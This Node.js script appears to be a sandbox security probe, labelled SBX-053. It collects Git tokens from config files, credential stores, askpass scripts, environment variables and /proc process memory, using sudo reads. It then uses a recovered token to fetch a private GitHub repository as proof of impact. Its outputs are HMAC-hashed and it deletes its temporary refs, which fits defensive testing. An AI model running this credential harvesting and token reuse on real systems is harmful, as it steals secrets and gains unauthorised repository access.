#!/usr/bin/env node

import { createHmac, timingSafeEqual } from "node:crypto";
import { open, stat } from "node:fs/promises";
import { isAbsolute, resolve } from "node:path";
import { spawnSync } from "node:child_process";

const TEST_ID = "SBX-053";
const NONCE = /^[0-9a-f]{64}$/u;
const HMAC = /^[0-9a-f]{64}$/u;
const COMMIT = /^(?:[0-9a-f]{40}|[0-9a-f]{64})$/u;
const REF = /^refs\/heads\/[A-Za-z0-9][A-Za-z0-9._\/-]{0,126}$/u;
const SENTINEL_PATH = /^[A-Za-z0-9._/-]{1,192}$/u;
const MAX_FILE_BYTES = 32 * 1024;
const MAX_CANDIDATE_BYTES = 4_096;
const MAX_CANDIDATES = 128;
const MAX_GIT_OUTPUT = 16 * 1024;

const SURFACES_CHECKED = [
  "remote-command",
  "repo-config",
  "worktree-config",
  "credential-helper-config",
  "global-config",
  "dynamic-config",
  "credential-store",
  "dynamic-credential-store",
  "relevant-environment",
  "self-cmdline",
  "parent-cmdline",
  "init-cmdline",
  "self-environ",
  "parent-environ",
  "init-environ",
  "askpass-script",
];

const GLOBAL_CONFIGS = [
  "/etc/gitconfig",
  "/usr/local/etc/gitconfig",
  "/root/.gitconfig",
  "/root/.config/git/config",
  "/vercel/.gitconfig",
  "/vercel/.config/git/config",
  "/home/ubuntu/.gitconfig",
  "/home/ubuntu/.config/git/config",
  "/home/arch/.gitconfig",
  "/home/arch/.config/git/config",
  "/home/vercel-sandbox/.gitconfig",
  "/home/vercel-sandbox/.config/git/config",
];

const CREDENTIAL_STORES = [
  "/root/.git-credentials",
  "/vercel/.git-credentials",
  "/home/ubuntu/.git-credentials",
  "/home/arch/.git-credentials",
  "/home/vercel-sandbox/.git-credentials",
  "/root/.netrc",
  "/vercel/.netrc",
  "/home/ubuntu/.netrc",
  "/home/arch/.netrc",
  "/home/vercel-sandbox/.netrc",
];

const SUDO_READ_PATHS = new Set([
  ...GLOBAL_CONFIGS,
  ...CREDENTIAL_STORES,
  "/proc/1/cmdline",
  "/proc/1/environ",
]);

function hmac(key, nonce) {
  return createHmac("sha256", key).update(nonce, "ascii").digest("hex");
}

function exactHmac(left, right) {
  return HMAC.test(left) && HMAC.test(right) && timingSafeEqual(
    Buffer.from(left, "ascii"),
    Buffer.from(right, "ascii"),
  );
}

function canonicalRepositoryRoot(raw) {
  if (typeof raw !== "string" || raw.length < 2 || raw.length > 768 ||
      raw.includes("\0") || !isAbsolute(raw) || resolve(raw) !== raw) {
    throw new Error("invalid repository root");
  }
  return raw;
}

function canonicalGitHubUrl(raw) {
  const value = new URL(raw);
  if (value.protocol !== "https:" || value.hostname !== "github.com" || value.port !== "" ||
      value.username !== "" || value.password !== "" || value.search !== "" || value.hash !== "" ||
      !/^\/[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+\.git$/u.test(value.pathname)) {
    throw new Error("invalid repository URL");
  }
  return value.toString();
}

function canonicalRef(raw) {
  if (!REF.test(raw) || raw.includes("..") || raw.includes("//") || raw.endsWith("/") ||
      raw.includes("@{") || raw.endsWith(".")) {
    throw new Error("invalid sentinel ref");
  }
  return raw;
}

function canonicalSentinelPath(raw) {
  if (!SENTINEL_PATH.test(raw) || raw.startsWith("/") || raw.split("/").some((part) =>
    part === "" || part === "." || part === "..")) {
    throw new Error("invalid sentinel path");
  }
  return raw;
}

async function readBounded(path, limit = MAX_FILE_BYTES) {
  let handle;
  try {
    const metadata = await stat(path);
    if (!metadata.isFile() || metadata.size > limit) {
      return { found: metadata.isFile(), complete: false, text: "" };
    }
    handle = await open(path, "r");
    const bytes = Buffer.alloc(limit + 1);
    const result = await handle.read(bytes, 0, bytes.length, null);
    if (result.bytesRead > limit) return { found: true, complete: false, text: "" };
    return { found: true, complete: true, text: bytes.subarray(0, result.bytesRead).toString("utf8") };
  } catch (error) {
    if (error && typeof error === "object" && (error.code === "EACCES" || error.code === "EPERM") &&
        elevatedReadAllowed(path)) {
      const elevated = spawnSync("sudo", ["-n", "head", "-c", String(limit + 1), "--", path], {
        encoding: null,
        timeout: 5_000,
        maxBuffer: limit + 2_048,
        windowsHide: true,
      });
      if (elevated.status === 0 && Buffer.isBuffer(elevated.stdout)) {
        if (elevated.stdout.length > limit) return { found: true, complete: false, text: "" };
        return { found: true, complete: true, text: elevated.stdout.toString("utf8") };
      }
      const absent = spawnSync("sudo", ["-n", "test", "!", "-e", path], {
        encoding: null,
        timeout: 5_000,
        maxBuffer: 2_048,
        windowsHide: true,
      });
      if (absent.status === 0) return { found: false, complete: true, text: "" };
      return { found: false, complete: false, text: "" };
    }
    if (error && typeof error === "object" &&
        (error.code === "ENOENT" || error.code === "ENOTDIR" || error.code === "EISDIR")) {
      return { found: false, complete: true, text: "" };
    }
    return { found: false, complete: false, text: "" };
  } finally {
    await handle?.close().catch(() => undefined);
  }
}

function elevatedReadAllowed(path) {
  return SUDO_READ_PATHS.has(path) ||
    /^\/proc\/[1-9][0-9]*\/(?:cmdline|environ|status)$/u.test(path) ||
    /^(?:\/root|\/vercel)\/(?:\.gitconfig|\.git-credentials|\.netrc|\.config\/git\/config)$/u
      .test(path);
}

function cleanCandidate(raw) {
  let value = raw;
  if (value.startsWith('"') && value.endsWith('"') || value.startsWith("'") && value.endsWith("'")) {
    value = value.slice(1, -1);
  }
  value = value.replace(/[\r\n]+$/u, "");
  if (value.length === 0 || Buffer.byteLength(value, "utf8") > MAX_CANDIDATE_BYTES ||
      value.includes("\0")) return null;
  return value;
}

function decodeUrlPassword(raw) {
  try {
    const value = new URL(raw);
    if ((value.protocol !== "https:" && value.protocol !== "http:") || value.password === "") return null;
    return decodeURIComponent(value.password);
  } catch {
    return null;
  }
}

function extractTextCandidates(text, add, options = {}) {
  for (const match of text.matchAll(/https?:\/\/[^\s"'<>]+/gu)) {
    const password = decodeUrlPassword(match[0]);
    if (password !== null) add(password);
  }

  for (const match of text.matchAll(/(?:authorization\s*:\s*)?basic\s+([A-Za-z0-9+/]+={0,2})/giu)) {
    try {
      const decoded = Buffer.from(match[1], "base64").toString("utf8");
      const separator = decoded.indexOf(":");
      if (separator >= 0) add(decoded.slice(separator + 1));
    } catch {
      // Ignore malformed Basic values from a bounded, attacker-controlled config file.
    }
  }

  for (const match of text.matchAll(/(?:password|passwd|token|credential)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\r\n#;]+))/giu)) {
    add(match[1] ?? match[2] ?? match[3] ?? "");
  }

  for (const match of text.matchAll(/(?:github_pat_[A-Za-z0-9_]{20,4085}|gh[pousr]_[A-Za-z0-9._-]{20,4085})/gu)) {
    add(match[0]);
  }

  if (options.askpass === true) {
    for (const match of text.matchAll(/(?:echo|printf(?:\s+['"]?%s\\n['"]?)?)\s+(?:"([^"]+)"|'([^']+)'|([^\s;|&]+))/gu)) {
      const value = match[1] ?? match[2] ?? match[3] ?? "";
      if (!/^(?:username|password)(?:\s|$)/iu.test(value)) add(value);
    }
    for (const match of text.matchAll(/["']([^"'\r\n]{12,4096})["']/gu)) add(match[1]);
  }
}

function parseEnvironment(text) {
  const entries = [];
  for (const entry of text.split("\0")) {
    const separator = entry.indexOf("=");
    if (separator > 0) entries.push([entry.slice(0, separator), entry.slice(separator + 1)]);
  }
  return entries;
}

function relevantEnvironmentCandidate(name) {
  if (name === "GIT_ASKPASS" || name === "SSH_ASKPASS") return false;
  return name === "GITHUB_TOKEN" || name === "GH_TOKEN" || name === "GIT_CONFIG_PARAMETERS" ||
    /^VERCEL_GIT_[A-Z0-9_]+$/u.test(name) ||
    /^(?:(?:GIT|SOURCE|SANDBOX_SOURCE)_[A-Z0-9_]*(?:TOKEN|PASSWORD|PASS|CREDENTIAL)|GIT_CONFIG_VALUE_[0-9]+)$/u
      .test(name);
}

function extractEnvironmentCandidates(entries, add, askpassPaths) {
  const configValues = new Map();
  const complete = entries.length <= 256;
  for (const [name, value] of entries.slice(0, 256)) {
    if (name === "GIT_ASKPASS" || name === "SSH_ASKPASS") askpassPaths.add(value);
    if (relevantEnvironmentCandidate(name)) {
      if (name.startsWith("GIT_CONFIG_VALUE_")) configValues.set(name.slice("GIT_CONFIG_VALUE_".length), value);
      else add(value);
      extractTextCandidates(value, add);
    }
  }
  for (const value of configValues.values()) extractTextCandidates(value, add);
  return complete;
}

function extractCommandLineCandidates(text, add) {
  const split = text.split("\0");
  if (split.at(-1) === "") split.pop();
  const complete = split.length <= 128;
  for (const argument of split.slice(0, 128)) {
    extractTextCandidates(argument, add);
    const match = argument.match(/^(?:--)?(?:password|passwd|token|credential)=(.*)$/iu);
    if (match) add(match[1]);
  }
  return complete;
}

function askpassConfigPaths(text) {
  const result = [];
  for (const match of text.matchAll(/(?:core\.)?askpass\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\r\n#;]+))/giu)) {
    result.push((match[1] ?? match[2] ?? match[3] ?? "").trim());
  }
  return result;
}

function runGit(repositoryRoot, args, environment = undefined) {
  return spawnSync("git", args, {
    cwd: repositoryRoot,
    env: environment ?? {
      ...process.env,
      PATH: process.env.PATH ?? "/usr/bin:/bin",
      HOME: process.env.HOME ?? "/vercel",
      GIT_TERMINAL_PROMPT: "0",
    },
    encoding: "utf8",
    timeout: 30_000,
    maxBuffer: MAX_GIT_OUTPUT,
    windowsHide: true,
  });
}

function canonicalTargetPath(raw, home) {
  let value = raw.trim();
  if ((value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))) value = value.slice(1, -1);
  if (value === "~") value = home;
  else if (value.startsWith("~/")) value = resolve(home, value.slice(2));
  if (!isAbsolute(value) || value.length > 768 || value.includes("\0") || resolve(value) !== value ||
      value.startsWith("/proc/") || value.startsWith("/sys/") || value.startsWith("/dev/")) return null;
  return value;
}

function configValueLines(text) {
  return text.split(/\r?\n/u).flatMap((line) => {
    if (line.length === 0) return [];
    const tab = line.lastIndexOf("\t");
    return [tab >= 0 ? line.slice(tab + 1) : line];
  });
}

function helperStorePaths(text, home) {
  const paths = [];
  let unsupported = false;
  for (const raw of configValueLines(text)) {
    const helper = raw.trim();
    if (helper === "") continue;
    if (!/^store(?:\s|$)/u.test(helper)) {
      unsupported = true;
      continue;
    }
    const file = helper.match(/--file(?:=|\s+)(?:"([^"]+)"|'([^']+)'|(\S+))/u);
    if (!file) {
      const xdgHome = process.env.XDG_CONFIG_HOME ?? resolve(home, ".config");
      for (const defaultPath of [
        resolve(home, ".git-credentials"),
        resolve(xdgHome, "git/credentials"),
      ]) {
        const target = canonicalTargetPath(defaultPath, home);
        if (target === null) unsupported = true;
        else paths.push(target);
      }
      continue;
    }
    const target = canonicalTargetPath(file[1] ?? file[2] ?? file[3] ?? "", home);
    if (target === null) unsupported = true;
    else paths.push(target);
  }
  return { paths, unsupported };
}

function dynamicConfigPaths(home) {
  const paths = new Set();
  const add = (raw) => {
    if (typeof raw !== "string" || raw === "") return;
    const path = canonicalTargetPath(raw, home);
    if (path !== null) paths.add(path);
  };
  add(resolve(home, ".gitconfig"));
  add(resolve(process.env.XDG_CONFIG_HOME ?? resolve(home, ".config"), "git/config"));
  add(process.env.GIT_CONFIG_SYSTEM);
  add(process.env.GIT_CONFIG_GLOBAL);
  return paths;
}

async function collectParentProcesses(addCommand, addEnvironment, askpassPaths) {
  let complete = true;
  let statusPath = "/proc/self/status";
  const seen = new Set();
  for (let depth = 0; depth < 8; depth += 1) {
    const status = await readBounded(statusPath, 8 * 1024);
    complete &&= status.complete;
    if (!status.found) return process.platform !== "linux" && status.complete;
    if (!status.complete) break;
    const match = status.text.match(/^PPid:\s+([0-9]+)$/mu);
    if (!match) {
      complete = false;
      break;
    }
    const pid = Number(match[1]);
    if (pid === 0) return complete;
    if (!Number.isSafeInteger(pid) || pid < 1 || seen.has(pid)) {
      complete = false;
      break;
    }
    seen.add(pid);
    const cmdline = await readBounded(`/proc/${pid}/cmdline`);
    const environ = await readBounded(`/proc/${pid}/environ`);
    complete &&= cmdline.complete && environ.complete;
    const commandComplete = extractCommandLineCandidates(cmdline.text, addCommand);
    const environmentComplete = extractEnvironmentCandidates(
      parseEnvironment(environ.text),
      addEnvironment,
      askpassPaths,
    );
    complete = commandComplete && environmentComplete && complete;
    if (pid === 1) return complete;
    statusPath = `/proc/${pid}/status`;
  }
  return false;
}

async function collect(repositoryRoot, nonce) {
  const raw = [];
  const publicObservations = [];
  const dedupe = new Set();
  const askpassPaths = new Set();
  let complete = true;

  const addFor = (surface) => (input) => {
    const candidate = cleanCandidate(input);
    if (candidate === null) return;
    const key = `${surface}\0${candidate}`;
    if (dedupe.has(key)) return;
    if (raw.length >= MAX_CANDIDATES) {
      complete = false;
      return;
    }
    dedupe.add(key);
    const digest = hmac(candidate, nonce);
    raw.push({ surface, value: candidate, length: Buffer.byteLength(candidate, "utf8"), hmacSha256: digest });
    publicObservations.push({ surface, length: Buffer.byteLength(candidate, "utf8"), hmacSha256: digest });
  };

  const gitDirectoryPath = resolve(repositoryRoot, ".git");
  let gitDirectory = gitDirectoryPath;
  const dotGit = await readBounded(gitDirectoryPath, 4_096);
  if (dotGit.found && dotGit.text.startsWith("gitdir:")) {
    const target = dotGit.text.slice("gitdir:".length).trim();
    if (target.length > 0 && target.length <= 768 && !target.includes("\0")) {
      gitDirectory = resolve(repositoryRoot, target);
    } else complete = false;
  }

  const configInputs = [
    [resolve(gitDirectory, "config"), "repo-config"],
    [resolve(gitDirectory, "config.worktree"), "worktree-config"],
  ];
  for (const [path, surface] of configInputs) {
    const result = await readBounded(path);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor(surface));
    for (const pathValue of askpassConfigPaths(result.text)) askpassPaths.add(pathValue);
  }

  const remote = runGit(repositoryRoot, ["remote", "get-url", "--all", "origin"]);
  if (remote.error || remote.signal || (remote.status !== 0 && remote.status !== 2)) complete = false;
  extractTextCandidates(remote.stdout ?? "", addFor("remote-command"));

  const helpers = runGit(repositoryRoot, ["config", "--local", "--show-origin", "--get-all", "credential.helper"]);
  if (helpers.error || helpers.signal || (helpers.status !== 0 && helpers.status !== 1)) complete = false;
  extractTextCandidates(helpers.stdout ?? "", addFor("credential-helper-config"));

  const effectiveConfig = runGit(repositoryRoot,
    ["config", "--show-origin", "--show-scope", "--list"]);
  if (effectiveConfig.error || effectiveConfig.signal || effectiveConfig.status !== 0) complete = false;
  const effectiveConfigText = effectiveConfig.stdout ?? "";
  extractTextCandidates(effectiveConfigText, addFor("dynamic-config"));
  for (const pathValue of askpassConfigPaths(effectiveConfigText)) askpassPaths.add(pathValue);

  const effectiveHelpers = runGit(repositoryRoot,
    ["config", "--show-origin", "--show-scope", "--get-all", "credential.helper"]);
  if (effectiveHelpers.error || effectiveHelpers.signal ||
      (effectiveHelpers.status !== 0 && effectiveHelpers.status !== 1)) complete = false;
  extractTextCandidates(effectiveHelpers.stdout ?? "", addFor("credential-helper-config"));

  for (const path of GLOBAL_CONFIGS) {
    const result = await readBounded(path);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor("global-config"));
    for (const pathValue of askpassConfigPaths(result.text)) askpassPaths.add(pathValue);
  }

  const home = process.env.HOME ?? "/vercel";
  for (const path of dynamicConfigPaths(home)) {
    const result = await readBounded(path);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor("dynamic-config"));
    for (const pathValue of askpassConfigPaths(result.text)) askpassPaths.add(pathValue);
  }

  for (const path of [...new Set(CREDENTIAL_STORES)]) {
    const result = await readBounded(path);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor("credential-store"));
  }

  const dynamicStores = helperStorePaths(effectiveHelpers.stdout ?? "", home);
  if (dynamicStores.unsupported) complete = false;
  for (const path of [...new Set(dynamicStores.paths)]) {
    const result = await readBounded(path);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor("dynamic-credential-store"));
  }

  const currentEntries = Object.entries(process.env).flatMap(([name, value]) =>
    value === undefined ? [] : [[name, value]]);
  const currentEnvironmentComplete = extractEnvironmentCandidates(
    currentEntries,
    addFor("relevant-environment"),
    askpassPaths,
  );
  complete = currentEnvironmentComplete && complete;

  const procInputs = [
    ["/proc/self/cmdline", "self-cmdline", "cmdline"],
    ["/proc/1/cmdline", "init-cmdline", "cmdline"],
    ["/proc/self/environ", "self-environ", "environ"],
    ["/proc/1/environ", "init-environ", "environ"],
  ];
  for (const [path, surface, kind] of procInputs) {
    const result = await readBounded(path);
    complete &&= result.complete;
    if (kind === "cmdline") {
      const argumentsComplete = extractCommandLineCandidates(result.text, addFor(surface));
      complete = argumentsComplete && complete;
    } else {
      const environmentComplete = extractEnvironmentCandidates(
        parseEnvironment(result.text),
        addFor(surface),
        askpassPaths,
      );
      complete = environmentComplete && complete;
    }
  }

  const parentProcessesComplete = await collectParentProcesses(
    addFor("parent-cmdline"),
    addFor("parent-environ"),
    askpassPaths,
  );
  complete = parentProcessesComplete && complete;

  const boundedAskpassPaths = [...askpassPaths];
  if (boundedAskpassPaths.length > 16) complete = false;
  for (const path of boundedAskpassPaths.slice(0, 16)) {
    if (!isAbsolute(path) || path.length > 768 || path.includes("\0") ||
        path.startsWith("/proc/") || path.startsWith("/sys/") || path.startsWith("/dev/")) {
      complete = false;
      continue;
    }
    const result = await readBounded(path, 16 * 1024);
    complete &&= result.complete;
    extractTextCandidates(result.text, addFor("askpass-script"), { askpass: true });
  }

  publicObservations.sort((left, right) =>
    left.surface.localeCompare(right.surface) || left.hmacSha256.localeCompare(right.hmacSha256));
  raw.sort((left, right) =>
    left.surface.localeCompare(right.surface) || left.hmacSha256.localeCompare(right.hmacSha256));
  return { complete, raw, publicObservations };
}

function scanResponse(result) {
  return {
    schemaVersion: 1,
    testId: TEST_ID,
    operation: "scan",
    complete: result.complete,
    surfacesChecked: SURFACES_CHECKED,
    observations: result.publicObservations,
    candidatesTruncated: !result.complete && result.raw.length === MAX_CANDIDATES,
  };
}

async function impact(repositoryRoot, nonce, expectedTokenHmac, expectedTokenLength, sourceUrl,
  sentinelRef, sentinelCommit, sentinelPath, challenge) {
  if (!HMAC.test(expectedTokenHmac) || !Number.isSafeInteger(expectedTokenLength) ||
      expectedTokenLength < 1 || expectedTokenLength > MAX_CANDIDATE_BYTES || !NONCE.test(challenge)) {
    throw new Error("invalid expected proof values");
  }
  const canonicalUrl = canonicalGitHubUrl(sourceUrl);
  const canonicalReference = canonicalRef(sentinelRef);
  const canonicalPath = canonicalSentinelPath(sentinelPath);
  if (!COMMIT.test(sentinelCommit)) throw new Error("invalid sentinel commit");

  const result = await collect(repositoryRoot, nonce);
  const recovered = result.raw.find((entry) => entry.length === expectedTokenLength &&
    exactHmac(entry.hmacSha256, expectedTokenHmac));
  const branch = canonicalReference.slice("refs/heads/".length);
  const remoteReference = `refs/remotes/origin/${branch}`;
  const temporaryReference = `refs/sbx053-proof/${nonce.slice(0, 24)}`;
  const anonymousReference = `refs/sbx053-anonymous-control/${nonce.slice(0, 24)}`;
  let temporaryRefDeleted = true;
  let anonymousControlRefDeleted = true;

  const localRefAbsentBefore = runGit(repositoryRoot,
    ["show-ref", "--verify", "--quiet", canonicalReference]).status === 1;
  const remoteRefAbsentBefore = runGit(repositoryRoot,
    ["show-ref", "--verify", "--quiet", remoteReference]).status === 1;
  const presentProbe = runGit(repositoryRoot, ["cat-file", "-e", "HEAD^{commit}"]);
  const sourceCommitPresentBefore = presentProbe.status === 0 && !presentProbe.error &&
    !presentProbe.signal;
  const commitProbe = runGit(repositoryRoot, ["cat-file", "-e", `${sentinelCommit}^{commit}`]);
  const commitProbeExitCode = commitProbe.status;
  const commitAbsentBefore = commitProbeExitCode === 128 && !commitProbe.error && !commitProbe.signal;

  let fetchSucceeded = false;
  let fetchedCommitExact = false;
  let anonymousFetchDenied = false;
  let anonymousFetchExitCode = null;
  let anonymousHttpStatus = null;
  let anonymousTransportAttributed = false;
  let sentinelLength = null;
  let sentinelHmacSha256 = null;
  try {
    if (recovered && localRefAbsentBefore && remoteRefAbsentBefore &&
        sourceCommitPresentBefore && commitAbsentBefore) {
      const anonymousEnvironment = {
        PATH: process.env.PATH ?? "/usr/bin:/bin",
        HOME: "/nonexistent-sbx053-home",
        GIT_TERMINAL_PROMPT: "0",
        GIT_ASKPASS: "/bin/false",
        GIT_TRACE_CURL: "1",
        GIT_TRACE_CURL_NO_DATA: "1",
        GIT_CONFIG_SYSTEM: "/dev/null",
        GIT_CONFIG_GLOBAL: "/dev/null",
        GIT_CONFIG_COUNT: "2",
        GIT_CONFIG_KEY_0: "credential.helper",
        GIT_CONFIG_VALUE_0: "",
        GIT_CONFIG_KEY_1: "http.extraHeader",
        GIT_CONFIG_VALUE_1: "",
      };
      const anonymous = runGit(repositoryRoot, [
        "fetch", "--force", "--no-tags", "--depth=1", canonicalUrl,
        `${canonicalReference}:${anonymousReference}`,
      ], anonymousEnvironment);
      anonymousFetchExitCode = anonymous.status;
      const statuses = typeof anonymous.stderr === "string"
        ? [...anonymous.stderr.matchAll(/<= Recv header: HTTP\/(?:1\.[01]|2|3)\s+([0-9]{3})(?:\s|$)/gu)]
            .map((match) => Number(match[1]))
        : [];
      anonymousHttpStatus = statuses.at(-1) ?? null;
      anonymousTransportAttributed = anonymousFetchExitCode === 128 &&
        (anonymousHttpStatus === 401 || anonymousHttpStatus === 404) &&
        !anonymous.error && !anonymous.signal;
      anonymousFetchDenied = anonymousTransportAttributed;
      const anonymousRemoval = runGit(repositoryRoot, ["update-ref", "-d", anonymousReference]);
      anonymousControlRefDeleted = anonymousRemoval.status === 0;

      const basic = Buffer.from(`x-access-token:${recovered.value}`, "utf8").toString("base64");
      const environment = {
        PATH: process.env.PATH ?? "/usr/bin:/bin",
        HOME: "/nonexistent-sbx053-home",
        GIT_TERMINAL_PROMPT: "0",
        GIT_ASKPASS: "/bin/false",
        GIT_CONFIG_SYSTEM: "/dev/null",
        GIT_CONFIG_GLOBAL: "/dev/null",
        GIT_CONFIG_COUNT: "2",
        GIT_CONFIG_KEY_0: "credential.helper",
        GIT_CONFIG_VALUE_0: "",
        GIT_CONFIG_KEY_1: "http.extraHeader",
        GIT_CONFIG_VALUE_1: `Authorization: Basic ${basic}`,
      };
      const fetched = anonymousFetchDenied && anonymousControlRefDeleted
        ? runGit(repositoryRoot, [
            "fetch", "--force", "--no-tags", "--depth=1", canonicalUrl,
            `${canonicalReference}:${temporaryReference}`,
          ], environment)
        : null;
      fetchSucceeded = fetched !== null && fetched.status === 0 && !fetched.error && !fetched.signal;
      if (fetchSucceeded) {
        const revision = runGit(repositoryRoot, ["rev-parse", `${temporaryReference}^{commit}`]);
        fetchedCommitExact = revision.status === 0 &&
          (revision.stdout ?? "").trim().toLowerCase() === sentinelCommit;
        if (fetchedCommitExact) {
          const shown = runGit(repositoryRoot, ["show", `${temporaryReference}:${canonicalPath}`]);
          if (shown.status === 0 && typeof shown.stdout === "string" &&
              Buffer.byteLength(shown.stdout, "utf8") <= 8_192) {
            sentinelLength = Buffer.byteLength(shown.stdout, "utf8");
            sentinelHmacSha256 = hmac(shown.stdout, challenge);
          }
        }
      }
    }
  } finally {
    const anonymousRemoved = runGit(repositoryRoot, ["update-ref", "-d", anonymousReference]);
    anonymousControlRefDeleted &&= anonymousRemoved.status === 0;
    const removed = runGit(repositoryRoot, ["update-ref", "-d", temporaryReference]);
    temporaryRefDeleted = removed.status === 0;
  }

  return {
    schemaVersion: 1,
    testId: TEST_ID,
    operation: "impact",
    scanComplete: result.complete,
    credentialMatched: recovered !== undefined,
    credentialSurface: recovered?.surface ?? null,
    localRefAbsentBefore,
    remoteRefAbsentBefore,
    sourceCommitPresentBefore,
    commitProbeExitCode,
    commitAbsentBefore,
    anonymousFetchDenied,
    anonymousFetchExitCode,
    anonymousHttpStatus,
    anonymousTransportAttributed,
    anonymousControlRefDeleted,
    fetchSucceeded,
    fetchedCommitExact,
    sentinelLength,
    sentinelHmacSha256,
    temporaryRefDeleted,
  };
}

async function main() {
  const [operation, root, nonce, ...args] = process.argv.slice(2);
  const repositoryRoot = canonicalRepositoryRoot(root);
  if (!NONCE.test(nonce)) throw new Error("invalid nonce");
  if (operation === "scan" && args.length === 0) {
    process.stdout.write(`${JSON.stringify(scanResponse(await collect(repositoryRoot, nonce)))}\n`);
    return;
  }
  if (operation === "impact" && args.length === 7) {
    const [expectedHmac, expectedLength, sourceUrl, sentinelRef, sentinelCommit, sentinelPath, challenge] = args;
    const response = await impact(repositoryRoot, nonce, expectedHmac, Number(expectedLength), sourceUrl,
      sentinelRef, sentinelCommit, sentinelPath, challenge);
    process.stdout.write(`${JSON.stringify(response)}\n`);
    return;
  }
  throw new Error("invalid operation");
}

main().catch(() => {
  process.stderr.write("SBX-053 guest probe failed\n");
  process.exitCode = 1;
});
